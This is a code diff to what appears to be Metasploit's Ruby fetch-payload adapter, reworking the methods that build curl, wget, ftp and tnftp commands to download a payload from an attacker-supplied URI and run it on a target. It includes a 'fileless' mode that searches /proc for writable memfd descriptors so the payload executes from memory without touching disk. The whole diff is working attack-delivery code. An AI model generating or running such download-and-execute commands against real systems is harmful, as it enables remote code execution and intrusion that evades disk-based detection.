@@ -243,13 +243,13 @@ module Msf::Payload::Adapter::Fetch
     # if found one, try to download payload into the anonymous file
     # and execute it
     cmd << '; then while read f'
-    cmd << '; do if [[ $(ls -al $f | grep -o memfd | wc -l) == 1 ]]'
+    cmd << '; do if [[ $(ls -al $f | grep -o memfd) ]]'
     cmd << "; then #{get_file_cmd}"
     cmd << '; $f'
     cmd << '; FOUND=1'
     cmd << '; break'
     cmd << '; fi'
-    cmd << '; done <<< $(find /proc/$i/fd -type l -perm u=rwx)'
+    cmd << '; done <<< $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
     cmd << '; fi'
     cmd << '; done'
 
@@ -259,36 +259,36 @@ module Msf::Payload::Adapter::Fetch
   def _generate_curl_command
     case fetch_protocol
     when 'HTTP'
-      fetch_command = "curl http://#{download_uri} -so"
+      fetch_command = "curl -so #{_remote_destination} http://#{download_uri}"
     when 'HTTPS'
-      fetch_command = "curl https://#{download_uri} -sko"
+      fetch_command = "curl -sko #{_remote_destination} https://#{download_uri}"
     when 'TFTP'
-      fetch_command = "curl tftp://#{download_uri} -so"
+      fetch_command = "curl -so #{_remote_destination} tftp://#{download_uri}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
     if datastore['FETCH_FILELESS'] && linux?
-      return _generate_fileless(fetch_command + ' $f')
+      return _generate_fileless(fetch_command)
     else
-      return fetch_command + " #{_remote_destination}#{_execute_add}"
+      return fetch_command + " #{_execute_add}"
     end
   end
 
   def _generate_ftp_command
     case fetch_protocol
     when 'FTP'
-      fetch_command = "ftp ftp://#{download_uri} -Vo"
+      fetch_command = "ftp -Vo #{_remote_destination_nix} ftp://#{download_uri}"
     when 'HTTP'
-      fetch_command = "ftp http://#{download_uri} -Vo"
+      fetch_command = "ftp -Vo #{_remote_destination_nix} http://#{download_uri}"
     when 'HTTPS'
-      fetch_command = "ftp https://#{download_uri} -Vo"
+      fetch_command = "ftp -Vo #{_remote_destination_nix} https://#{download_uri}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
     if datastore['FETCH_FILELESS'] && linux?
-      return _generate_fileless(fetch_command + ' $f')
+      return _generate_fileless(fetch_command)
     else
-      return fetch_command + " #{_remote_destination_nix}#{_execute_nix}"
+      return fetch_command + "#{_execute_nix}"
     end
   end
 
@@ -315,34 +315,35 @@ module Msf::Payload::Adapter::Fetch
   def _generate_tnftp_command
     case fetch_protocol
     when 'FTP'
-      fetch_command = "tnftp ftp://#{download_uri} -Vo"
+      fetch_command = "tnftp -Vo #{_remote_destination_nix} ftp://#{download_uri}"
     when 'HTTP'
-      fetch_command = "tnftp http://#{download_uri} -Vo"
+      fetch_command = "tnftp -Vo #{_remote_destination_nix} http://#{download_uri}"
     when 'HTTPS'
-      fetch_command = "tnftp https://#{download_uri} -Vo"
+      fetch_command = "tnftp -Vo #{_remote_destination_nix} https://#{download_uri}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
     if datastore['FETCH_FILELESS'] && linux?
-      return _generate_fileless(fetch_command + ' $f')
+      return _generate_fileless(fetch_command)
     else
-      return fetch_command + " #{_remote_destination_nix}#{_execute_nix}"
+      return fetch_command + "#{_execute_nix}"
     end
   end
 
   def _generate_wget_command
     case fetch_protocol
     when 'HTTPS'
-      fetch_command = "wget --no-check-certificate https://#{download_uri} -qO"
+      fetch_command = "wget -qO #{_remote_destination} --no-check-certificate https://#{download_uri}"
     when 'HTTP'
-      fetch_command = "wget http://#{download_uri} -qO"
+      fetch_command = "wget -qO #{_remote_destination} http://#{download_uri}"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
+
     if datastore['FETCH_FILELESS'] && linux?
-      return _generate_fileless(fetch_command + ' $f')
+      return _generate_fileless(fetch_command)
     else
-      return fetch_command + " #{_remote_destination}#{_execute_add}"
+      return fetch_command + "#{_execute_add}"
     end
   end
 
@@ -355,6 +356,10 @@ module Msf::Payload::Adapter::Fetch
   def _remote_destination_nix
     return @remote_destination_nix unless @remote_destination_nix.nil?
 
+    if datastore['FETCH_FILELESS']
+      @remote_destination_nix = '$f'
+      return @remote_destination_nix
+    end
     writable_dir = datastore['FETCH_WRITABLE_DIR']
     writable_dir = '.' if writable_dir.blank?
     writable_dir += '/' unless writable_dir[-1] == '/'
